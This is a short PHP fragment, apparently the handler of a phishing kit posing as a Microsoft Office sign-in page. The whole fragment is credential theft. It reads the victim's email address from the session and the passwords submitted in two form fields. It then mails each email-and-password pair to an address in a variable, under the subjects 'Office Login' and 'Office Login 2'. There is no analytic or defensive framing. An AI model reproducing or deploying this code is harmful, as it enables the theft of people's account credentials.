...
if(isset($_POST['password_awal'])) {
    mail($to, 'Office Login', "Email: ".base64_decode($_SESSION['email'])." | Pass: {$_POST['password_awal']}");
    //print json_encode(['success' => true]);
    //exit();
}

if(isset($_POST['password_akhir'])) {
    mail($to, 'Office Login 2', "Email: ".base64_decode($_SESSION['email'])." | Pass: {$_POST['password_akhir']}");
    //print json_encode(['success' => true]);
    //exit();
}
?>
